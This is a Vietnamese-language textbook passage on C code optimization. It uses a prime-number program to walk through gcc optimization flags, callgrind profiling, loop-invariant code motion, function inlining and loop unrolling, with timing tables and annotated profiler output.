<p><strong>Bảng 2.</strong> Các hàm đã cải tiến, nhân số thứ nhất với 10 và cộng số thứ hai vào. Có tại <a href="C12-CodeOpt/_attachments/shiftadd.c">liên kết này</a>.</p>
<p>Việc loại bỏ truy cập bộ nhớ không cần thiết giúp lập trình viên giữ nguyên khả năng đọc của hàm <code>shiftAdd</code> gốc, đồng thời cho phép trình biên dịch tối ưu hàm.</p>
<h3 id="hợp-tác-với-trình-biên-dịch-một-chương-trình-mẫu"><a class="header" href="#hợp-tác-với-trình-biên-dịch-một-chương-trình-mẫu">Hợp tác với trình biên dịch: Một chương trình mẫu</a></h3>
<p>Trong các phần tiếp theo, chúng ta sẽ tập trung tìm hiểu thêm về các loại tối ưu hóa phổ biến và thảo luận các chiến lược lập trình, profiling để giúp trình biên dịch dễ dàng tối ưu code hơn.<br />
Để dẫn dắt nội dung, chúng ta sẽ cùng tối ưu chương trình sau (được viết chưa tối ưu) nhằm tìm tất cả các số nguyên tố từ 2 đến <em>n</em> (mã nguồn có tại <a href="C12-CodeOpt/_attachments/optExample.c">liên kết này</a>).</p>
<pre><code class="language-c">//helper function: checks to see if a number is prime
int isPrime(int x) {
    int i;
    for (i = 2; i &lt; sqrt(x) + 1; i++) { //no prime number is less than 2
        if (x % i == 0) { //if the number is divisible by i
            return 0; //it is not prime
        }
    }
    return 1; //otherwise it is prime
}

// finds the next prime
int getNextPrime(int prev) {
    int next = prev + 1;
    while (!isPrime(next)) { //while the number is not prime
        next++; //increment and check again
    }
    return next;
}

// generates a sequence of primes
int genPrimeSequence(int *array, int limit) {
    int i;
    int len = limit;
    if (len == 0) return 0;
    array[0] = 2; //initialize the first number to 2
    for (i = 1; i &lt; len; i++) {
        array[i] = getNextPrime(array[i-1]); //fill in the array
        if (array[i] &gt; limit) {
            len = i;
            return len;
        }
    }
    return len;
}

int main(int argc, char **argv) {
  //omitted for brevity
  int *array = allocateArray(limit);
  int length = genPrimeSequence(array, limit);

  return 0;
}
</code></pre>
<p><strong>Bảng 3</strong> cho thấy kết quả đo thời gian để tạo ra các số nguyên tố từ 2 đến 5.000.000 với các optimization flag hóa khác nhau, sử dụng lệnh biên dịch cơ bản sau:</p>
<pre><code class="language-bash">$ gcc -o optExample optExample.c -lm
</code></pre>
<h4 id="kết-quả-thời-gian-giây"><a class="header" href="#kết-quả-thời-gian-giây">Kết quả thời gian (giây)</a></h4>
<div class="table-wrapper"><table><thead><tr><th>Unoptimized</th><th><code>-O1</code></th><th><code>-O2</code></th><th><code>-O3</code></th></tr></thead><tbody>
<tr><td>3.86</td><td>2.32</td><td>2.14</td><td>2.15</td></tr>
</tbody></table>
</div>
<p><strong>Bảng 3.</strong> Thời gian (giây) để tạo các số nguyên tố từ 2 đến 5.000.000</p>
<p>Thời gian nhanh nhất quan sát được khi dùng optimization flag hóa là khoảng <strong>2,14 giây</strong>.<br />
Mặc dù việc sử dụng các optimization flag hóa giúp giảm hơn một giây so với thời gian chạy ban đầu của chương trình, nhưng việc tăng mức tối ưu hóa chỉ mang lại cải thiện rất nhỏ.<br />
Trong các phần tiếp theo, chúng ta sẽ thảo luận cách có thể chỉnh sửa chương trình để giúp trình biên dịch dễ dàng tối ưu hơn.</p>
<h3 id="tài-liệu-tham-khảo-6"><a class="header" href="#tài-liệu-tham-khảo-6">Tài liệu tham khảo</a></h3>
<ol>
<li>
<p>John Regehr. <em>&quot;A Guide to Undefined Behavior in C and C++, Part 1&quot;</em>.<br />
<a href="https://blog.regehr.org/archives/213">https://blog.regehr.org/archives/213</a></p>
</li>
<li>
<p>C FAQ. <em>&quot;comp.lang.c FAQ list: Question 11.33&quot;</em>.<br />
<a href="http://c-faq.com/ansi/undef.html">http://c-faq.com/ansi/undef.html</a></p>
</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div><h2 id="121-những-bước-đầu-tiên-trong-tối-ưu-code-code-profiling-phân-tích-hiệu-năng-code"><a class="header" href="#121-những-bước-đầu-tiên-trong-tối-ưu-code-code-profiling-phân-tích-hiệu-năng-code">12.1. Những bước đầu tiên trong tối ưu code: Code Profiling (Phân tích hiệu năng code)</a></h2>
<p><em>“Vấn đề thực sự là các lập trình viên đã dành quá nhiều thời gian lo lắng về hiệu suất ở những nơi sai và vào những thời điểm sai; tối ưu hóa sớm là cội nguồn của mọi điều xấu (hoặc ít nhất là phần lớn) trong lập trình.”</em> — Don Knuth, <em>The Art of Computer Programming</em></p>
<p>Một trong những nguy hiểm lớn nhất trong tối ưu code là khái niệm <strong>premature optimization</strong> (tối ưu hóa sớm). Tối ưu hóa sớm xảy ra khi lập trình viên cố gắng tối ưu dựa trên “cảm giác” về nơi xảy ra sự kém hiệu quả, thay vì dựa trên dữ liệu. Bất cứ khi nào có thể, điều quan trọng là phải đo thời gian chạy của các phần khác nhau trong code với các đầu vào khác nhau <em>trước khi</em> bắt đầu tối ưu, để xác định <strong>hot spot</strong> (điểm nóng) — những khu vực trong chương trình mà có nhiều lệnh được thực thi nhất.</p>
<p>Để tìm cách tối ưu <a href="C12-CodeOpt/_attachments/optExample.c">optExample.c</a>, hãy bắt đầu bằng cách xem kỹ hơn hàm <code>main</code>:</p>
<pre><code class="language-c">int main(int argc, char **argv) {
    // error-handling and timing code omitted for brevity

    int limit = strtol(argv[1], NULL, 10);
    int length = limit;
    int *array = allocateArray(length); //allocates array of specified length

    genPrimeSequence(array, limit, &amp;length); //generates sequence of primes

    return 0;
}
</code></pre>
<p>Hàm <code>main</code> gọi hai hàm: <code>allocateArray</code>, khởi tạo một mảng với độ dài (hoặc giới hạn) do người dùng chỉ định, và <code>genPrimeSequence</code>, tạo ra một dãy số nguyên tố trong giới hạn đã cho (lưu ý rằng với bất kỳ dãy số nào từ 2 đến <em>n</em>, số lượng số nguyên tố không thể vượt quá <em>n</em>, và thường ít hơn đáng kể).<br />
Hàm <code>main</code> trong <a href="C12-CodeOpt/_attachments/optExample.c">tệp C</a> chứa code đo thời gian thực thi của hai hàm trên. Khi biên dịch và chạy chương trình với <code>limit</code> = 5.000.000, ta thu được kết quả:</p>
<pre><code>$ gcc -o optExample optExample.c -lm
$ time -p ./optExample 5000000
Time to allocate: 5.5e-05
Time to generate primes: 3.85525
348513 primes found.
real 3.85
user 3.86
sys 0.00
</code></pre>
<p>Chương trình <code>optExample</code> mất khoảng 3,86 giây để hoàn thành, với gần như toàn bộ thời gian nằm trong hàm <code>genPrimeSequence</code>.<br />
Không có lý do gì để tốn công tối ưu <code>allocateArray</code>, vì mọi cải thiện ở đây sẽ không đáng kể đối với thời gian chạy tổng thể.<br />
Trong các ví dụ tiếp theo, chúng ta sẽ tập trung hơn vào hàm <code>genPrimeSequence</code> và các hàm liên quan. Các hàm này được liệt kê lại dưới đây để tiện theo dõi:</p>
<pre><code class="language-c">// helper function: checks to see if a number is prime
int isPrime(int x) {
    int i;
    for (i = 2; i &lt; sqrt(x) + 1; i++) { //no prime number is less than 2
        if (x % i == 0) { //if the number is divisible by i
            return 0; //it is not prime
        }
    }
    return 1; //otherwise it is prime
}

// finds the next prime
int getNextPrime(int prev) {
    int next = prev + 1;
    while (!isPrime(next)) { //while the number is not prime
        next++; //increment and check again
    }
    return next;
}

// generates a sequence of primes
int genPrimeSequence(int *array, int limit) {
    int i;
    int len = limit;
    if (len == 0) return 0;
    array[0] = 2; //initialize the first number to 2
    for (i = 1; i &lt; len; i++) {
        array[i] = getNextPrime(array[i-1]); //fill in the array
        if (array[i] &gt; limit) {
            len = i;
            return len;
        }
    }
    return len;
}
</code></pre>
<p>Để tìm <strong>hot spot</strong> trong một chương trình, hãy tập trung vào các khu vực có nhiều vòng lặp nhất. Việc kiểm tra code thủ công có thể giúp xác định các hot spot, mặc dù luôn cần xác minh lại bằng các công cụ đo hiệu năng trước khi tiến hành tối ưu.<br />
Khi kiểm tra thủ công chương trình <code>optExample</code>, ta có các nhận xét sau:</p>
<ul>
<li>
<p>Hàm <code>genPrimeSequence</code> cố gắng tạo tất cả các số nguyên tố từ 2 đến một số nguyên <em>n</em>. Vì số lượng số nguyên tố từ 2 đến <em>n</em> không thể vượt quá <em>n</em>, vòng lặp <code>for</code> trong <code>genPrimeSequence</code> chạy tối đa <em>n</em> lần. Mỗi vòng lặp gọi hàm <code>getNextPrime</code> một lần. Do đó, <code>getNextPrime</code> chạy tối đa <em>n</em> lần.</p>
</li>
<li>
<p>Vòng lặp <code>while</code> trong <code>getNextPrime</code> sẽ tiếp tục chạy cho đến khi tìm được một số nguyên tố. Mặc dù khó xác định trước số lần vòng lặp <code>while</code> này chạy theo <em>n</em> (khoảng cách giữa các số nguyên tố liên tiếp có thể rất lớn), nhưng chắc chắn rằng <code>isPrime</code> được gọi ở mỗi lần lặp của <code>while</code>.</p>
</li>
<li>
<p>Hàm <code>isPrime</code> chứa đúng một vòng lặp <code>for</code>. Giả sử vòng lặp này chạy tổng cộng <em>k</em> lần, thì phần thân vòng lặp sẽ chạy <em>k</em> lần.<br />
Nhớ lại rằng <a href="C12-CodeOpt/../C1-C_intro/conditionals.html#_loops_in_c">cấu trúc của vòng lặp for</a> gồm: <em>initialization statement</em> (câu lệnh khởi tạo biến lặp), <em>Boolean expression</em> (biểu thức điều kiện dừng vòng lặp), và <em>step expression</em> (biểu thức bước, cập nhật biến lặp mỗi vòng).<br />
<strong>Bảng 1</strong> dưới đây mô tả số lần mỗi thành phần của vòng lặp được thực thi trong một vòng lặp <code>for</code> chạy <em>k</em> lần. Trong mọi vòng lặp <code>for</code>, phần khởi tạo chỉ chạy đúng một lần. Biểu thức điều kiện chạy <em>k + 1</em> lần (vì cần một lần kiểm tra cuối để thoát vòng lặp). Phần thân vòng lặp và biểu thức bước chạy <em>k</em> lần mỗi loại.</p>
</li>
</ul>
<div class="table-wrapper"><table><thead><tr><th>Initialization statement</th><th>Boolean expression</th><th>Step expression</th><th>Loop body</th></tr></thead><tbody>
<tr><td>1</td><td><em>k</em> + 1</td><td><em>k</em></td><td><em>k</em></td></tr>
</tbody></table>
</div>
<p><strong>Bảng 1.</strong> Các thành phần thực thi của vòng lặp (giả sử chạy <em>k</em> lần)</p>
<p>Qua kiểm tra thủ công, ta thấy chương trình dành phần lớn thời gian trong hàm <code>isPrime</code>, và hàm <code>sqrt</code> được gọi nhiều nhất. Tiếp theo, chúng ta sẽ sử dụng <strong>code profiling</strong> để xác minh giả thuyết này.</p>
<h3 id="1211-sử-dụng-callgrind-để-phân-tích-hiệu-năng-profile"><a class="header" href="#1211-sử-dụng-callgrind-để-phân-tích-hiệu-năng-profile">12.1.1. Sử dụng Callgrind để phân tích hiệu năng (Profile)</a></h3>
<p>Trong chương trình nhỏ của chúng ta, việc kiểm tra code thủ công để đưa ra giả thuyết rằng hàm <code>sqrt</code> xuất hiện trong một <strong>hot spot</strong> (điểm nóng) của code là khá đơn giản. Tuy nhiên, việc xác định các hot spot có thể trở nên phức tạp hơn trong các chương trình lớn. Dù thế nào, việc sử dụng <strong>profiling</strong> (phân tích hiệu năng) để xác minh giả thuyết vẫn là một ý tưởng hay. Các công cụ phân tích hiệu năng code như <a href="http://valgrind.org/">Valgrind</a> cung cấp rất nhiều thông tin về quá trình thực thi chương trình. Trong phần này, chúng ta sẽ sử dụng công cụ <code>callgrind</code> để kiểm tra <strong>call graph</strong> (đồ thị lời gọi hàm) của chương trình <code>optExample</code>.</p>
<pre><code>$ gcc -g -o optExample optExample.c -lm
$ valgrind --tool=callgrind ./optExample 100000
==32590== Callgrind, a call-graph generating cache profiler
==32590== Copyright (C) 2002-2015, and GNU GPL'd, by Josef Weidendorfer et al.
==32590== Using Valgrind-3.11.0 and LibVEX; rerun with -h for copyright info
==32590== Command: ./optExample 100000
==32590==
==32590== For interactive control, run 'callgrind_control -h'.
Time to allocate: 0.003869
Time to generate primes: 0.644743
9592 primes found.
==32590==
==32590== Events    : Ir
==32590== Collected : 68338759
==32590==
==32590== I   refs:      68,338,759
</code></pre>
<p>Để sử dụng <code>callgrind</code>, trước tiên hãy biên dịch lại chương trình <code>optExample</code> với cờ <code>-g</code> và chạy <code>callgrind</code> trên một phạm vi nhỏ hơn (từ 2 đến 100.000). Giống như các ứng dụng Valgrind khác, <code>callgrind</code> chạy như một lớp bao quanh chương trình, thêm các chú thích như số lần các hàm được thực thi và tổng số lệnh được thực thi. Do đó, chương trình <code>optExample</code> sẽ chạy lâu hơn khi kết hợp với <code>callgrind</code>.</p>
<p>Gõ <code>ls</code> trong terminal sẽ xuất hiện một tệp mới có tên <code>callgrind.out.xxxxx</code>, trong đó <code>xxxxx</code> là một ID duy nhất. Trong trường hợp này, tệp là <code>callgrind.out.32590</code> (tức là số hiển thị ở cột bên trái trong kết quả trước đó). Chạy <code>callgrind_annotate</code> trên tệp này sẽ cho thông tin bổ sung về ba hàm mà chúng ta quan tâm:</p>
<pre><code>$ callgrind_annotate --auto=yes callgrind.out.32590
    ----------------------------------------------------------------
Profile data file 'callgrind.out.32393' (creator: callgrind-3.11.0)
    ----------------------------------------------------------------
...
    .  //helper function: checks to see if a number is prime
    400,004  int isPrime(int x) {
            .      int i;
36,047,657      for (i = 2; i &lt; sqrt(x)+1; i++) { //no prime is less than 2
13,826,015  =&gt; ???:sqrt (2765204x)
16,533,672          if (x % i == 0) { //if the number is divisible by i
    180,818              return 0; //it is not prime
            .          }
            .      }
        9,592      return 1; //otherwise it is prime
    200,002  }
            .
            .  // finds the next prime
    38,368  int getNextPrime(int prev) {
    28,776      int next = prev + 1;
    509,597      while (!isPrime(next)) { //while the number is not prime
67,198,556  =&gt; optExample.c:isPrime (100001x)
    90,409          next++; //increment and check again
            .      }
        9,592      return next;
    19,184  }
            .
            .  // generates a sequence of primes
            6  int genPrimeSequence(int * array, int limit) {
            .      int i;
            2      int len = limit;
            2      if (len == 0) return 0;
            2      array[0]=2; //initialize the first number to 2
    38,369      for (i = 1; i &lt; len; i++) {
    143,880          array[i] = getNextPrime(array[i-1]); //fill in the array
67,894,482  =&gt; optExample.c:getNextPrime (9592x)
    76,736          if (array[i] &gt; limit){
            2              len = i;
            2              return len;
            .          }
            .      }
            .      return len;
            4  }

</code></pre>
<p>Các con số ở cột bên trái biểu thị tổng số lệnh được thực thi liên quan đến từng dòng code. Các con số trong ngoặc đơn cho biết số lần một hàm cụ thể được chạy. Dựa vào các con số này, chúng ta có thể xác minh kết quả của việc kiểm tra thủ công.<br />
Trong hàm <code>genPrimeSequence</code>, hàm <code>getNextPrime</code> tạo ra số lượng lệnh thực thi nhiều nhất — 67,8 triệu lệnh, tương ứng với 9.592 lần gọi hàm (để tạo các số nguyên tố từ 2 đến 100.000).<br />
Kiểm tra <code>getNextPrime</code> cho thấy phần lớn số lệnh này (67,1 triệu, tức 99%) đến từ lời gọi hàm <code>isPrime</code>, được gọi tổng cộng 100.001 lần.<br />
Cuối cùng, kiểm tra <code>isPrime</code> cho thấy 13 triệu lệnh (20,5%) đến từ hàm <code>sqrt</code>, được thực thi tổng cộng 2,7 triệu lần.</p>
<p>Các kết quả này xác nhận giả thuyết ban đầu rằng chương trình dành phần lớn thời gian trong hàm <code>isPrime</code>, và hàm <code>sqrt</code> là hàm được gọi nhiều nhất. Giảm tổng số lệnh thực thi sẽ giúp chương trình chạy nhanh hơn; phân tích trên gợi ý rằng nỗ lực ban đầu nên tập trung vào việc cải thiện hàm <code>isPrime</code>, và có thể giảm số lần gọi <code>sqrt</code>.</p>
<h3 id="1212-loop-invariant-code-motion-di-chuyển-code-bất-biến-ra-khỏi-vòng-lặp"><a class="header" href="#1212-loop-invariant-code-motion-di-chuyển-code-bất-biến-ra-khỏi-vòng-lặp">12.1.2. Loop-Invariant Code Motion (Di chuyển code bất biến ra khỏi vòng lặp)</a></h3>
<p><strong>Loop-invariant code motion</strong> là một kỹ thuật tối ưu hóa di chuyển các phép tính tĩnh (không thay đổi) bên trong vòng lặp ra ngoài vòng lặp mà không ảnh hưởng đến hành vi của vòng lặp. Các <strong>optimizing compiler</strong> (trình biên dịch tối ưu) có thể tự động thực hiện hầu hết các tối ưu hóa dạng này.<br />
Cụ thể, cờ biên dịch <code>-fmove-loop-invariants</code> trong GCC (được bật ở mức <code>-O1</code>) sẽ cố gắng xác định các trường hợp loop-invariant code và di chuyển chúng ra ngoài vòng lặp tương ứng.</p>
<p>Tuy nhiên, trình biên dịch không phải lúc nào cũng xác định được các trường hợp loop-invariant, đặc biệt là với <strong>function call</strong> (lời gọi hàm). Vì lời gọi hàm có thể vô tình gây ra <strong>side effect</strong> (tác dụng phụ — hành vi không mong muốn), hầu hết các trình biên dịch sẽ tránh cố gắng xác định xem một hàm có luôn trả về cùng một kết quả hay không.<br />
Do đó, mặc dù lập trình viên biết rằng <code>sqrt(x)</code> luôn trả về căn bậc hai của <code>x</code>, GCC sẽ không luôn giả định điều đó.<br />
Hãy xem xét trường hợp hàm <code>sqrt</code> cập nhật một biến toàn cục bí mật <code>g</code>. Khi đó, việc gọi <code>sqrt</code> một lần bên ngoài vòng lặp (<em>một</em> lần cập nhật <code>g</code>) không giống với việc gọi nó ở mỗi vòng lặp (<em>n</em> lần cập nhật <code>g</code>). Nếu trình biên dịch không thể xác định rằng một hàm luôn trả về cùng kết quả, nó sẽ không tự động di chuyển lời gọi hàm đó ra ngoài vòng lặp.</p>
<p>Tuy nhiên, lập trình viên biết rằng việc di chuyển phép tính <code>sqrt(x) + 1</code> ra ngoài vòng lặp <code>for</code> sẽ không ảnh hưởng đến hành vi của vòng lặp. Hàm đã chỉnh sửa được hiển thị dưới đây và có sẵn <a href="C12-CodeOpt/_attachments/optExample2.c">trong tệp này</a>:</p>
<pre><code class="language-c">//helper function: checks to see if a number is prime
int isPrime(int x) {
    int i;
    int max = sqrt(x)+1;
    for (i = 2; i &lt; max; i++) { //no prime number is less than 2
        if (x % i == 0) { //if the number is divisible by i
            return 0; //it is not prime
        }
    }
    return 1; //otherwise it is prime
}
</code></pre>
<p><strong>Bảng 2</strong> cho thấy thay đổi đơn giản này giúp giảm hẳn 2 giây (47%) thời gian chạy của <code>optExample2</code>, ngay cả trước khi sử dụng các optimization flag của trình biên dịch. Hơn nữa, trình biên dịch dường như dễ dàng tối ưu <code>optExample2</code> hơn một chút.</p>
<div class="table-wrapper"><table><thead><tr><th>Phiên bản</th><th>Unoptimized</th><th><code>-O1</code></th><th><code>-O2</code></th><th><code>-O3</code></th></tr></thead><tbody>
<tr><td>Original</td><td>3.86</td><td>2.32</td><td>2.14</td><td>2.15</td></tr>
<tr><td>With loop-invariant code motion</td><td>1.83</td><td>1.63</td><td>1.71</td><td>1.63</td></tr>
</tbody></table>
</div>
<p><strong>Bảng 2.</strong> Thời gian (giây) để tạo các số nguyên tố từ 2 đến 5.000.000</p>
<p>Chạy lại <code>callgrind</code> trên file thực thi <code>optExample2</code> cho thấy lý do tại sao thời gian chạy được cải thiện nhiều như vậy. Đoạn code dưới đây giả định rằng tệp <code>callgrind.out.30086</code> chứa các chú thích khi chạy <code>callgrind</code> trên <code>optExample2</code>:</p>
<pre><code>$ gcc -g -o optExample2 optExample2.c -lm
$ valgrind --tool=callgrind ./optExample2 100000
$ callgrind_annotate --auto=yes callgrind.out.30086
    ------------------------------------------------------------------
Profile data file 'callgrind.out.30086' (creator: callgrind-3.11.0)
    ------------------------------------------------------------------
    ...
    400,004  int isPrime(int x) {
            .      int i;
    900,013      int max = sqrt(x)+1;
    500,000  =&gt; ???:sqrt (100001x)
11,122,449      for (i = 2; i &lt; max; i++) { //no prime number is less than 2
16,476,120          if (x % i == 0) { //if the number is divisible by i
    180,818              return 0; //it is not prime
            .          }
            .      }
        9,592      return 1; //otherwise it is prime
    200,002  }
            .
            .  // finds the next prime
    38,368  int getNextPrime(int prev) {
    28,776      int next = prev + 1;
    509,597      while (!isPrime(next)) { //while the number is not prime
29,789,794  =&gt; optExample2.c:isPrime (100001x)
    90,409          next++; //increment and check again
            .      }
        9,592      return next;
    19,184  }

</code></pre>
<p>Việc di chuyển lời gọi <code>sqrt</code> ra ngoài vòng lặp <code>for</code> đã giảm số lần gọi hàm <code>sqrt</code> trong chương trình từ 2,7 triệu xuống còn 100.000 (giảm 96%). Con số này tương ứng với số lần hàm <code>isPrime</code> được gọi, xác nhận rằng hàm <code>sqrt</code> chỉ thực thi một lần cho mỗi lần gọi <code>isPrime</code>.</p>
<p>Lưu ý rằng trình biên dịch có thể thực hiện mức tối ưu hóa đáng kể khi bật các optimization flag, ngay cả khi lập trình viên không tự tay di chuyển code. Trong trường hợp này, lý do là nhờ một lệnh đặc biệt gọi là <code>fsqrt</code> được quy định trong <strong>x86 ISA</strong>. Khi bật các optimization flag, trình biên dịch thay thế tất cả các lời gọi hàm <code>sqrt</code> bằng lệnh <code>fsqrt</code>.<br />
Quá trình này được gọi là <strong>inlining</strong> (nội tuyến), và chúng ta sẽ tìm hiểu chi tiết hơn trong phần tiếp theo. Vì <code>fsqrt</code> không còn là một hàm, trình biên dịch dễ dàng nhận ra tính loop-invariant của nó và di chuyển nó ra ngoài thân vòng lặp.</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="122-các-tối-ưu-hóa-khác-của-trình-biên-dịch-loop-unrolling-và-function-inlining"><a class="header" href="#122-các-tối-ưu-hóa-khác-của-trình-biên-dịch-loop-unrolling-và-function-inlining">12.2. Các tối ưu hóa khác của trình biên dịch: Loop Unrolling và Function Inlining</a></h2>
<p>Kỹ thuật tối ưu <strong>loop-invariant code motion</strong> (di chuyển code bất biến ra khỏi vòng lặp) được mô tả ở phần trước là một thay đổi đơn giản nhưng mang lại sự giảm đáng kể thời gian thực thi. Tuy nhiên, các tối ưu hóa như vậy phụ thuộc vào từng tình huống cụ thể và không phải lúc nào cũng cải thiện hiệu năng. Trong hầu hết các trường hợp, việc di chuyển code bất biến ra khỏi vòng lặp đã được trình biên dịch tự động xử lý.</p>
<p>Ngày nay, mã nguồn thường được <strong>đọc</strong> nhiều hơn là <strong>viết</strong>. Trong đa số trường hợp, những cải thiện hiệu năng nhỏ lẻ không đáng để đánh đổi khả năng dễ đọc của code. Nói chung, lập trình viên nên để trình biên dịch tự tối ưu bất cứ khi nào có thể. Trong phần này, chúng ta sẽ tìm hiểu một số kỹ thuật tối ưu hóa mà trước đây lập trình viên thường tự thực hiện thủ công, nhưng hiện nay thường được trình biên dịch tự động áp dụng.</p>
<p>Có nhiều nguồn tài liệu trực tuyến khuyến khích việc tự tay áp dụng các kỹ thuật được mô tả trong các phần sau. Tuy nhiên, chúng tôi khuyến nghị bạn nên kiểm tra xem trình biên dịch của mình có hỗ trợ các tối ưu hóa này hay không trước khi cố gắng tự triển khai chúng trong code. Tất cả các tối ưu hóa được mô tả trong phần này đều được GCC hỗ trợ, nhưng có thể không có trong các trình biên dịch cũ.</p>
<h3 id="1221-function-inlining"><a class="header" href="#1221-function-inlining">12.2.1. Function Inlining</a></h3>
<p>Một bước tối ưu hóa mà trình biên dịch thường cố gắng thực hiện là <strong>function inlining</strong> (nội tuyến hàm), tức là thay thế lời gọi hàm bằng phần thân của hàm đó.<br />
Ví dụ, trong hàm <code>main</code>, nếu trình biên dịch nội tuyến hàm <code>allocateArray</code>, nó sẽ thay lời gọi <code>allocateArray</code> bằng lời gọi trực tiếp tới <code>malloc</code>:</p>
<div class="table-wrapper"><table><thead><tr><th>Phiên bản gốc</th><th>Phiên bản với <code>allocateArray</code> được inline</th></tr></thead><tbody>
<tr><td>```c</td><td>```c</td></tr>
<tr><td>int main(int argc, char **argv) {</td><td>int main(int argc, char **argv) {</td></tr>
<tr><td>// omitted for brevity</td><td>// omitted for brevity</td></tr>
<tr><td>// some variables shortened for space considerations</td><td>// some variables shortened for space considerations</td></tr>
<tr><td>int lim = strtol(argv[1], NULL, 10);</td><td>int lim = strtol(argv[1], NULL, 10);</td></tr>
<tr><td>// allocation of array</td><td>// allocation of array (in-lined)</td></tr>
<tr><td>int *a = allocateArray(lim);</td><td>int *a = malloc(lim * sizeof(int));</td></tr>
<tr><td>// generates sequence of primes</td><td>// generates sequence of primes</td></tr>
<tr><td>int len = genPrimeSequence(a, lim);</td><td>int len = genPrimeSequence(a, lim);</td></tr>
<tr><td>return 0;</td><td>return 0;</td></tr>
<tr><td>}</td><td>}</td></tr>
<tr><td>```</td><td>```</td></tr>
</tbody></table>
</div>
<p><strong>Bảng 1.</strong> Ví dụ trình biên dịch nội tuyến hàm <code>allocateArray</code>.</p>
<p>Việc nội tuyến hàm có thể giúp chương trình tiết kiệm thời gian chạy. Hãy nhớ rằng mỗi lần chương trình gọi một hàm, sẽ có nhiều lệnh liên quan đến việc <strong>tạo</strong> và <strong>hủy</strong> ngữ cảnh hàm được sinh ra. Nội tuyến hàm cho phép trình biên dịch loại bỏ các lời gọi dư thừa này, đồng thời giúp nó dễ dàng phát hiện các cơ hội tối ưu khác như <strong>constant propagation</strong> (truyền hằng), <strong>constant folding</strong> (gộp hằng), và <strong>dead code elimination</strong> (loại bỏ code chết).<br />
Trong trường hợp của chương trình <code>optExample</code>, việc nội tuyến có thể cho phép trình biên dịch thay lời gọi <code>sqrt</code> bằng lệnh <code>fsqrt</code>, và sau đó di chuyển nó ra ngoài vòng lặp.</p>
<p>Cờ <code>-finline-functions</code> gợi ý cho GCC rằng các hàm nên được nội tuyến. Tối ưu hóa này được bật ở mức <code>-O3</code>. Mặc dù <code>-finline-functions</code> có thể được sử dụng độc lập với <code>-O3</code>, nhưng đây chỉ là <em>gợi ý</em> để trình biên dịch tìm các hàm có thể nội tuyến. Tương tự, từ khóa <code>static inline</code> có thể được dùng để gợi ý rằng một hàm cụ thể nên được nội tuyến.<br />
Cần lưu ý rằng trình biên dịch sẽ không nội tuyến tất cả các hàm, và việc nội tuyến không đảm bảo sẽ làm code chạy nhanh hơn.</p>
<p>Lập trình viên nhìn chung nên tránh nội tuyến hàm thủ công. Việc này tiềm ẩn nguy cơ cao làm giảm đáng kể khả năng đọc code, tăng khả năng xuất hiện lỗi, và khiến việc cập nhật, bảo trì hàm trở nên khó khăn hơn. Ví dụ, cố gắng nội tuyến hàm <code>isPrime</code> vào trong <code>getNextPrime</code> sẽ làm giảm mạnh khả năng đọc của <code>getNextPrime</code>.</p>
<h3 id="1222-loop-unrolling"><a class="header" href="#1222-loop-unrolling">12.2.2. Loop Unrolling</a></h3>
<p>Chiến lược tối ưu hóa cuối cùng của trình biên dịch mà chúng ta thảo luận trong phần này là <strong>loop unrolling</strong> (trải vòng lặp). Hãy cùng xem lại hàm <code>isPrime</code>:</p>
<pre><code>// helper function: checks to see if a number is prime
int isPrime(int x) {
    int i;
    int max = sqrt(x) + 1;

    // no prime number is less than 2
    for (i = 2; i &lt; max; i++) {
        // if the number is divisible by i
        if (x % i == 0) {
            return 0; // it's not prime
        }
    }
    return 1; // otherwise it is
}
</code></pre>
<p>Vòng lặp <code>for</code> thực thi tổng cộng <code>max</code> lần, trong đó <code>max</code> bằng căn bậc hai của số nguyên <code>x</code> cộng thêm một.<br />
Ở cấp độ <strong>assembly</strong>, mỗi lần thực thi vòng lặp sẽ kiểm tra xem <code>i</code> có nhỏ hơn <code>max</code> hay không. Nếu có, <strong>instruction pointer</strong> (con trỏ lệnh) sẽ nhảy vào phần thân vòng lặp, nơi thực hiện phép toán modulo. Nếu phép modulo cho kết quả bằng 0, chương trình lập tức thoát khỏi vòng lặp và trả về 0. Ngược lại, vòng lặp tiếp tục chạy.<br />
Mặc dù <strong>branch predictor</strong> (bộ dự đoán nhánh) thường dự đoán khá chính xác giá trị của biểu thức điều kiện (đặc biệt là bên trong vòng lặp), nhưng các dự đoán sai có thể làm giảm hiệu năng do gây gián đoạn <strong>instruction pipeline</strong> (đường ống lệnh).</p>
<p><strong>Loop unrolling</strong> (trải vòng lặp) là một kỹ thuật tối ưu hóa mà trình biên dịch thực hiện để giảm tác động của các dự đoán sai. Trong loop unrolling, mục tiêu là giảm số vòng lặp đi một hệ số <em>n</em> bằng cách tăng khối lượng công việc mà mỗi vòng lặp thực hiện lên <em>n</em> lần.<br />
Khi một vòng lặp được unroll với hệ số 2, số vòng lặp sẽ giảm <strong>một nửa</strong>, trong khi lượng công việc mỗi vòng tăng <strong>gấp đôi</strong>.</p>
<p>Hãy áp dụng thủ công kỹ thuật loop unrolling hệ số 2 vào hàm <code>isPrime</code> của chúng ta (có trong <a href="C12-CodeOpt/_attachments/optExample3.c">optExample3.c</a>):</p>
<pre><code class="language-c">// helper function: checks to see if a number is prime
int isPrime(int x) {
    int i;
    int max = sqrt(x)+1;

    // no prime number is less than 2
    for (i = 2; i &lt; max; i+=2) {
        // if the number is divisible by i or i+1
        if ( (x % i == 0) || (x % (i+1) == 0) ) {
            return 0; // it's not prime
        }
    }
    return 1; // otherwise it is
}
</code></pre>
<p>Lưu ý rằng mặc dù chúng ta đã giảm một nửa số vòng lặp <code>for</code>, nhưng mỗi vòng lặp giờ thực hiện hai phép kiểm tra modulo, tức là khối lượng công việc mỗi vòng tăng gấp đôi.<br />
Khi biên dịch và chạy lại chương trình, thời gian chạy chỉ cải thiện một chút (xem <a href="C12-CodeOpt/loops_functions.html#NextTimes">Bảng 2</a>). Đồng thời, khả năng đọc của code cũng giảm.<br />
Một cách tốt hơn để tận dụng loop unrolling là sử dụng optimization flag hóa <code>-funroll-loops</code> của trình biên dịch, cờ này yêu cầu trình biên dịch unroll các vòng lặp có thể xác định số lần lặp ngay tại thời điểm biên dịch.<br />
Cờ <code>-funroll-all-loops</code> là một tùy chọn mạnh mẽ hơn, unroll tất cả các vòng lặp bất kể trình biên dịch có chắc chắn về số lần lặp hay không.<br />
